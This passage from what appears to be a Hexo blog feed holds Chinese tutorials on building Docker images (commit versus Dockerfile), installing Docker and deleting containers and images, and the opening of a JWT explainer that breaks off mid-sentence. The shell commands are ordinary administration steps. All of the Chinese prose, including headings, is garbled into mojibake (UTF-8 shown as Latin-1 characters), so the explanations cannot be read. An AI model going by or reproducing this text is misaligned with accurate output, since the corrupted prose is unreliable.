        <content type="html"><![CDATA[<h3 id="è‡ªå®šä¹‰æ„å»ºDockeré•œåƒ"><a href="#è‡ªå®šä¹‰æ„å»ºDockeré•œåƒ" class="headerlink" title="è‡ªå®šä¹‰æ„å»ºDockeré•œåƒ"></a>è‡ªå®šä¹‰æ„å»ºDockeré•œåƒ</h3><p>å®é™…ä¸Šæ‰€æœ‰å¸¸ç”¨çš„åº”ç”¨ç¨‹åºéƒ½æœ‰å¯¹åº”çš„é•œåƒï¼Œæˆ‘ä»¬åªéœ€è¦ä¸‹è½½è¿™äº›é•œåƒç„¶åå°±å¯ä»¥ä½¿ç”¨äº†ï¼Œè€Œä¸éœ€è¦è‡ªå·±å»æ‰‹åŠ¨å®‰è£…ï¼Œé¡¶å¤šéœ€è¦è¿›è¡Œä¸€äº›ç‰¹åˆ«çš„é…ç½®ã€‚ä½†æ˜¯æˆ‘ä»¬ç¨‹åºå‘˜åœ¨é‡åˆ°å°ä¼—é¡¹ç›®çš„æ—¶å€™ï¼Œå¯èƒ½æ²¡æœ‰æä¾›é•œåƒï¼Œè¿™æ—¶å°±è¦æˆ‘ä»¬æ‰‹åŠ¨å»å®‰è£…ï¼Œæ¥ç€æˆ‘ä»¬å°±æ¥çœ‹çœ‹å¦‚ä½•æ„å»ºæˆ‘ä»¬è‡ªå·±çš„Dockeré•œåƒã€‚æ„å»ºé•œåƒæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ä½¿ç”¨commitå‘½ä»¤æ¥å®Œæˆï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ä½¿ç”¨Dockerfileæ¥å®Œæˆï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ç§ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å°±åšä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæ¯”å¦‚æˆ‘ä»¬ç°åœ¨æƒ³è¦åœ¨Ubuntuçš„baseé•œåƒä¸­å®‰è£…Javaç¯å¢ƒï¼Œå¹¶å°†å…¶æ‰“åŒ…ä¸ºæ–°çš„é•œåƒï¼ˆè¿™ä¸ªæ–°çš„é•œåƒå°±æ˜¯ä¸€ä¸ªåŒ…å«Java8ç¯å¢ƒçš„Ubuntuç³»ç»Ÿé•œåƒï¼‰</p><h4 id="ç¬¬ä¸€ç§-commitå‘½ä»¤-ä¸æ¨è"><a href="#ç¬¬ä¸€ç§-commitå‘½ä»¤-ä¸æ¨è" class="headerlink" title="ç¬¬ä¸€ç§:commitå‘½ä»¤(ä¸æ¨è)"></a>ç¬¬ä¸€ç§:commitå‘½ä»¤(ä¸æ¨è)</h4><p>æ‹‰å–Ubuntué•œåƒ<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/16.png" alt="avatar"><br>æ¥ç€å¯åŠ¨Ubuntuï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/17.png" alt="avatar"></p><p>æ›´æ–°apt<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/18.png" alt="avatar"><br>aptå®‰è£…javaç¯å¢ƒ<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure><br>å®‰è£…å®ŒæˆåæŸ¥çœ‹ä¸€ä¸‹<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/19.png" alt="avatar"></p><p>é€€å‡ºUbuntuåˆ°Dockerç¯å¢ƒä¸‹<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/20.png" alt="avatar"><br>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/21.png" alt="avatar"></p><p>ä½¿ç”¨commitå‘½ä»¤å°†å®¹å™¨æ‰“åŒ…ä¸ºæ–°çš„é•œåƒï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit å®¹å™¨åç§°/ID æ–°çš„é•œåƒåç§°</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/22.png" alt="avatar"></p><p>æŸ¥çœ‹é•œåƒ<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/23.png" alt="avatar"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„é•œåƒå·²ç»è¢«æ‰“åŒ…å¥½äº†</p><p>è¿™ä¸ªæ–¹å¼å­˜åœ¨ä¸€ä¸ªé—®é¢˜,å°±æ˜¯å¦‚æœè¿™ä¸ªé•œåƒä¸æ˜¯æˆ‘ä»¬æ„å»ºçš„æˆ–è€…æ„å»ºå®Œè¿‡äº†ä¸€æ®µæ—¶é—´,æˆ‘ä»¬å°±ä¸çŸ¥é“å…·ä½“è¿™ä¸ªé•œåƒçš„æ„å»ºè¿‡ç¨‹,ä¹Ÿå°±æ˜¯è¯´<strong>æˆ‘ä»¬ä¸èƒ½ç¡®ä¿è¿™ä¸ªé•œåƒç™¾åˆ†ç™¾å®‰å…¨</strong>,è¿™å°±å¼•å‡ºäº†ä¸‹é¢è¿™ç§æ„å»ºæ–¹å¼</p><h4 id="ç¬¬äºŒç§-Dockerfile-æ¨è"><a href="#ç¬¬äºŒç§-Dockerfile-æ¨è" class="headerlink" title="ç¬¬äºŒç§:Dockerfile(æ¨è)"></a>ç¬¬äºŒç§:Dockerfile(æ¨è)</h4><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªåä¸ºDockerfileçš„æ–‡ä»¶ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch Dockerfile</span><br></pre></td></tr></table></figure></p><p>vimæ‰“å¼€Dockerfileè¿›è¡Œç¼–è¾‘<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi Dockerfile</span><br></pre></td></tr></table></figure><br><img src="https://pic-bed-1c9.pages.dev/img/24.png" alt="avatar"></p><p>Dockerfileå†…éƒ¨éœ€è¦æˆ‘ä»¬ç¼–å†™å¤šç§æŒ‡ä»¤æ¥å‘Šè¯‰Dockeræˆ‘ä»¬çš„é•œåƒçš„ç›¸å…³ä¿¡æ¯</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä½¿ç”¨FROMæŒ‡ä»¤æ¥é€‰æ‹©å½“å‰é•œåƒçš„åŸºç¡€é•œåƒï¼ˆå¿…é¡»ä»¥è¿™ä¸ªæŒ‡ä»¤å¼€å§‹ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ubuntuä½œä¸ºåŸºç¡€é•œåƒå³å¯ï¼Œå½“ç„¶å¦‚æœä¸éœ€è¦ä»»ä½•åŸºç¡€é•œåƒçš„è¯ï¼Œç›´æ¥ä½¿ç”¨scratchè¡¨ç¤ºä»é›¶å¼€å§‹æ„å»º:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br></pre></td></tr></table></figure><br>åœ¨å®¹å™¨ä¸­è¿è¡ŒRUNå‘½ä»¤æ¥å®‰è£…Javaç¯å¢ƒäº†<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RUN apt update</span><br><span class="line">RUN apt install -y openjdk-8-jdk</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/25.png" alt="avatar"><br>æ¯æ¡æŒ‡ä»¤æ‰§è¡Œä¹‹åï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„é•œåƒå±‚</p><p>é€€å‡ºå¹¶ä¿å­˜,è¿è¡Œbuildå‘½ä»¤æ„å»ºé•œåƒ<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t é•œåƒåç§° æ„å»ºç›®å½•</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/26.png" alt="avatar"><br>æ‰§è¡Œåï¼ŒDockerä¼šåœ¨æ„å»ºç›®å½•ä¸­å¯»æ‰¾Dockerfileæ–‡ä»¶ï¼Œç„¶åå¼€å§‹ä¾æ¬¡æ‰§è¡ŒDockerfileä¸­çš„æŒ‡ä»¤ï¼š</p><p>â€”tag, -t: é•œåƒçš„åå­—åŠæ ‡ç­¾ï¼Œé€šå¸¸ name:tag æˆ–è€… name æ ¼å¼ï¼›å¯ä»¥åœ¨ä¸€æ¬¡æ„å»ºä¸­ä¸ºä¸€ä¸ªé•œåƒè®¾ç½®å¤šä¸ªæ ‡ç­¾ã€‚æ„å»ºç›®å½•çš„.ä»£è¡¨å½“å‰ç›®å½•</p><p>æ„å»ºå®ŒæˆåæŸ¥çœ‹æœ¬åœ°é•œåƒ<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/27.png" alt="avatar"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨historyå‘½ä»¤æ¥æŸ¥çœ‹æ„å»ºå†å²<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker history ubuntu-java2:latest</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/28.png" alt="avatar"><br><img src="https://pb01.s3.bitiful.net/29.png" alt="avatar"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¯ä¸€æ­¥æˆ‘ä»¬æ„å»ºçš„å‘½ä»¤éƒ½æˆä¸ºäº†ä¸€ä¸ªé•œåƒ,æˆ‘ä»¬å¯ä»¥æ¸…æ¥šåœ°çŸ¥é“è¿™ä¸ªé•œåƒæ˜¯å¦‚ä½•è¢«æ„å»ºçš„,è€Œä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼æ„å»ºçš„é•œåƒæ˜¯çœ‹ä¸åˆ°å…·ä½“æ„å»ºå‘½ä»¤çš„</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerå®‰è£…ä¸é•œåƒä¸‹è½½å’Œåˆ é™¤(ä¼˜é›…)</title>
      <link href="/2023/11/23/Docker(1)/"/>
      <url>/2023/11/23/Docker(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="Dockerå®‰è£…ä¸é•œåƒä¸‹è½½å’Œåˆ é™¤-ä¼˜é›…"><a href="#Dockerå®‰è£…ä¸é•œåƒä¸‹è½½å’Œåˆ é™¤-ä¼˜é›…" class="headerlink" title="Dockerå®‰è£…ä¸é•œåƒä¸‹è½½å’Œåˆ é™¤(ä¼˜é›…)"></a>Dockerå®‰è£…ä¸é•œåƒä¸‹è½½å’Œåˆ é™¤(ä¼˜é›…)</h3><hr><p><strong>ç¯å¢ƒ:Ubuntu 22.04.3 LTS</strong></p><hr><h4 id="Dockerå®‰è£…"><a href="#Dockerå®‰è£…" class="headerlink" title="Dockerå®‰è£…"></a>Dockerå®‰è£…</h4><p>é¦–å…ˆå®‰è£…ä¸€äº›å·¥å…·ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure></p><p>æ¥ç€å®‰è£…å®˜æ–¹çš„GPG keyï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/apt/keyrings</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br></pre></td></tr></table></figure></p><p>æœ€åå°†Dockerçš„åº“æ·»åŠ åˆ°aptèµ„æºåˆ—è¡¨ä¸­ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure></p><p>æ¥ç€æˆ‘ä»¬æ›´æ–°ä¸€æ¬¡aptï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></p><p>æœ€åå®‰è£…Docker CEç‰ˆæœ¬ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce</span><br></pre></td></tr></table></figure></p><p>æœ€åæˆ‘ä»¬å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ°dockerç”¨æˆ·ç»„ä¸­ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker &lt;ç”¨æˆ·å&gt;</span><br></pre></td></tr></table></figure></p><p>é…ç½®å¥½åï¼Œæˆ‘ä»¬å…ˆé€€å‡ºSSHç»ˆç«¯ï¼Œç„¶åé‡æ–°è¿æ¥å°±å¯ä»¥ç”Ÿæ•ˆäº†ã€‚</p><h4 id="é•œåƒç›¸å…³æ“ä½œ"><a href="#é•œåƒç›¸å…³æ“ä½œ" class="headerlink" title="é•œåƒç›¸å…³æ“ä½œ"></a>é•œåƒç›¸å…³æ“ä½œ</h4><p>ä¸‹è½½é•œåƒ:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull repository:tag</span><br></pre></td></tr></table></figure></p><p>å®é™…ä¸Šä¸€ä¸ªé•œåƒçš„åç§°æ˜¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆçš„ï¼Œä¸€ä¸ªæ˜¯repositoryï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯tagï¼Œä¸€èˆ¬æƒ…å†µä¸‹çº¦å®šrepositoryå°±æ˜¯é•œåƒåç§°ï¼Œtagä½œä¸ºç‰ˆæœ¬ï¼Œé»˜è®¤ä¸ºlatestï¼Œè¡¨ç¤ºæœ€æ–°ç‰ˆæœ¬ã€‚</p><p>é•œåƒä¸‹è½½ä¹‹åä¼šå­˜æ”¾åœ¨æœ¬åœ°ï¼Œè¦å¯åŠ¨è¿™ä¸ªé•œåƒçš„å®¹å™¨ï¼Œå®é™…ä¸Šå°±åƒæˆ‘ä»¬ä¹‹å‰é‚£æ ·ï¼Œè¾“å…¥runå‘½ä»¤å°±å¯ä»¥äº†(ä»¥hello-worldé•œåƒä¸ºä¾‹)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ä¹‹åï¼Œä¼šä½¿ç”¨å½“å‰é•œåƒè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥pså‘½ä»¤æ¥æŸ¥çœ‹å½“å‰å®¹å™¨çš„å®¹å™¨åˆ—è¡¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>æ³¨æ„åé¢è¦åŠ ä¸€ä¸ª-aè¡¨ç¤ºæŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ˆå…¶ä»–é€‰é¡¹å¯ä»¥ä½¿ç”¨-hæŸ¥çœ‹ï¼‰ï¼Œå¦‚æœä¸åŠ çš„è¯ï¼Œåªä¼šæ˜¾ç¤ºå½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ã€‚</p><p>å¯ä»¥çœ‹åˆ°å®¹å™¨åˆ—è¡¨ä¸­æœ‰æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„hello-worldï¼ˆæ³¨æ„åŒä¸€ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ï¼‰ï¼Œæ¯ä¸ªå®¹å™¨éƒ½æœ‰ä¸€ä¸ªéšæœºç”Ÿæˆçš„å®¹å™¨IDå†™åœ¨æœ€å‰é¢ï¼Œåé¢æ˜¯å®¹å™¨çš„åˆ›å»ºæ—¶é—´ä»¥åŠå½“å‰çš„è¿è¡ŒçŠ¶æ€ï¼Œæœ€åä¸€åˆ—æ˜¯å®¹å™¨çš„åç§°ï¼Œåœ¨åˆ›å»ºå®¹å™¨æ—¶ï¼Œåç§°å¯ä»¥ç”±æˆ‘ä»¬æŒ‡å®šä¹Ÿå¯ä»¥è‡ªåŠ¨ç”Ÿæˆï¼Œè¿™é‡Œå°±æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p><p>å½“ä¸€ä¸ªé•œåƒæœ‰å¤šä¸ªå®¹å™¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æŒ‡å®šåç§°å¯åŠ¨ï¼Œåœ¨ä½¿ç”¨runå‘½ä»¤æ—¶ï¼Œæ·»åŠ â€”nameå‚æ•°å³å¯ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name=åç§° hello-world</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å¼€å¯å¤„äºåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure><br><strong>å®¹å™¨åç§°å¯ä»¥ä½¿ç”¨Tabé”®è‡ªåŠ¨è¡¥å…¨,IDå¯ä»¥åªè¾“å…¥å‰ä¸‰ä½</strong>(ä¸€èˆ¬ä¸ä¼šé‡å¤,é™¤éå®¹å™¨éå¸¸å¤š,è¿™æ—¶å°±å¾—ä¿è¯è¾“å…¥çš„IDçš„å‰nä½å¯ä»¥å”¯ä¸€æ ‡è¯†è¿™ä¸ªID)</p><p>å¦‚æœæƒ³è¦åœæ­¢å®¹å™¨ç›´æ¥è¾“å…¥stopå‘½ä»¤å°±å¯ä»¥äº†ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure></p><p>æˆ–æ˜¯é‡å¯ï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure></p><h4 id="åˆ é™¤å®¹å™¨"><a href="#åˆ é™¤å®¹å™¨" class="headerlink" title="åˆ é™¤å®¹å™¨"></a>åˆ é™¤å®¹å™¨</h4><p>å¦‚æœæˆ‘ä»¬ä¸éœ€è¦ä½¿ç”¨å®¹å™¨äº†ï¼Œé‚£ä¹ˆå¯ä»¥å°†å®¹å™¨åˆ é™¤ï¼Œä½†æ˜¯æ³¨æ„åªæœ‰å®¹å™¨å¤„äºéè¿è¡ŒçŠ¶æ€æ—¶æ‰å¯ä»¥åˆ é™¤ï¼š</p><p>å…ˆæŸ¥çœ‹æ‰€æœ‰å®¹å™¨:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></p><p>å¦‚æœè¦åˆ é™¤çš„å®¹å™¨ä»åœ¨è¿è¡Œ,å…ˆå°†å…¶åœæ­¢:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure></p><p>æœ€ååˆ é™¤:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure></p><p>å¦‚æœæƒ³è¦å¼ºåˆ¶åˆ é™¤å®¹å™¨,åŠ ä¸Š-få°±è¡Œ:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure><br>æ— è®ºå®¹å™¨æ˜¯å¦æ­£åœ¨è¿è¡Œä¸­æˆ–è€…å·²åœæ­¢ï¼Œéƒ½å¯è¢«å¼ºåˆ¶åˆ é™¤ï¼</p><h4 id="åˆ é™¤é•œåƒ"><a href="#åˆ é™¤é•œåƒ" class="headerlink" title="åˆ é™¤é•œåƒ"></a>åˆ é™¤é•œåƒ</h4><p>å…ˆæŸ¥çœ‹Dockerä¸­çš„é•œåƒ:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></p><p><strong>æƒ³è¦åˆ é™¤é•œåƒå°±å¾—å…ˆåˆ é™¤æ­¤é•œåƒçš„å…¨éƒ¨å®¹å™¨</strong></p><p><strong>åªæœ‰å®¹å™¨å¤„äºéè¿è¡ŒçŠ¶æ€æ—¶æ‰å¯ä»¥åˆ é™¤</strong></p><p>å…ˆæŸ¥çœ‹æ‰€æœ‰å®¹å™¨:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></p><p>å¦‚æœè¦åˆ é™¤çš„å®¹å™¨ä»åœ¨è¿è¡Œ,å…ˆå°†å…¶åœæ­¢:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure></p><p>åˆ é™¤å®¹å™¨:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm å®¹å™¨åç§°/å®¹å™¨ID</span><br></pre></td></tr></table></figure></p><p>åˆ é™¤é•œåƒ:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi é•œåƒID</span><br></pre></td></tr></table></figure><br><strong>é•œåƒIDä¹Ÿæ˜¯è¾“å…¥å‰ä¸‰ä½å°±å¥½</strong></p><p>å¦‚æœæƒ³è¦å¼ºåˆ¶åˆ é™¤é•œåƒ,åŠ ä¸Š-få°±è¡Œ:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f é•œåƒID</span><br></pre></td></tr></table></figure><br>é•œåƒä¸­çš„å®¹å™¨çŠ¶æ€ä¸ºå·²åœæ­¢æˆ–å·²åˆ é™¤çš„æ‰èƒ½è¢«å¼ºåˆ¶åˆ é™¤ï¼ŒåŒæ—¶å¯¹åº”çš„å®¹å™¨ä¹Ÿä¼šè¢«åˆ é™¤ã€‚è‹¥å®¹å™¨è¿˜åœ¨è¿è¡Œä¸­ï¼Œåˆ é™¤é•œåƒä¼šæŠ¥é”™ï¼</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWTè¯¦è§£</title>
      <link href="/2023/11/18/JWT%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/11/18/JWT%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="JWTè¯¦è§£"><a href="#JWTè¯¦è§£" class="headerlink" title="JWTè¯¦è§£"></a>JWTè¯¦è§£</h3><p><a href="https://jwt.io/introduction" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">JWTå®˜ç½‘</a></p><p><img src="https://pb01.s3.bitiful.net/13.png" alt="avatar"></p><h4 id="ä»€ä¹ˆæ˜¯JWT"><a href="#ä»€ä¹ˆæ˜¯JWT" class="headerlink" title="ä»€ä¹ˆæ˜¯JWT"></a>ä»€ä¹ˆæ˜¯JWT</h4><p>JWTçš„å…¨ç§°æ˜¯Json Web Tokenã€‚æ˜¯åŸºäºRFC 7519å¼€æ”¾æ ‡å‡†çš„ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘ä¸”ç‹¬ç«‹çš„æ–¹å¼ï¼Œç”¨äºåœ¨å„æ–¹ä¹‹é—´ä»¥ JSON å¯¹è±¡çš„å½¢å¼<strong>å®‰å…¨åœ°</strong>ä¼ è¾“ä¿¡æ¯ã€‚æ­¤ä¿¡æ¯å¯ä»¥ç”¨ä½œéªŒè¯å’Œç›¸äº’ä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯ç»è¿‡æ•°å­—ç­¾åçš„ã€‚JWT å¯ä»¥ä½¿ç”¨å¯†é’¥ï¼ˆä½¿ç”¨ HMAC ç®—æ³•ï¼‰æˆ–ä½¿ç”¨ RSA æˆ– ECDSA çš„å…¬é’¥/ç§é’¥å¯¹è¿›è¡Œç­¾åã€‚</p><p>JWTç”±ä¸‰éƒ¨åˆ†ç»„æˆ:<strong>Headerï¼ˆæ ‡å¤´ï¼‰</strong>,<strong>Payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰</strong>,<strong>Signatureï¼ˆç­¾åï¼‰</strong>,ä¸­é—´ç”¨ç‚¹åˆ†å¼€,å³<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.signature</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a href="https://jwt.io/#debugger-io" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">jwt.io.Debugger</a>å»è§£ç ,éªŒè¯å’Œç”ŸæˆJWTä»¤ç‰Œ.</p><p><img src="https://pb01.s3.bitiful.net/14.png" alt="avatar"></p><h4 id="Headerï¼ˆæ ‡å¤´ï¼‰"><a href="#Headerï¼ˆæ ‡å¤´ï¼‰" class="headerlink" title="Headerï¼ˆæ ‡å¤´ï¼‰"></a>Headerï¼ˆæ ‡å¤´ï¼‰</h4><p>Headeré€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä»¤ç‰Œçš„ç±»å‹ï¼ˆJWTï¼‰å’Œæ‰€ä½¿ç”¨çš„ç­¾åç®—æ³•ï¼ˆå¦‚HMAC SHA256æˆ–RSAï¼‰ã€‚<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>ç„¶åï¼Œè¿™ä¸ªJSONè¢«Base64Urlç¼–ç ï¼Œå½¢æˆJWTçš„ç¬¬ä¸€éƒ¨åˆ†ã€‚</p><h4 id="Payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰"><a href="#Payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰" class="headerlink" title="Payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰"></a>Payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰</h4><p>PayloadåŒ…å«å£°æ˜ã€‚å£°æ˜æ˜¯å…³äºå®ä½“ï¼ˆé€šå¸¸æ˜¯ç”¨æˆ·ï¼‰å’Œé™„åŠ 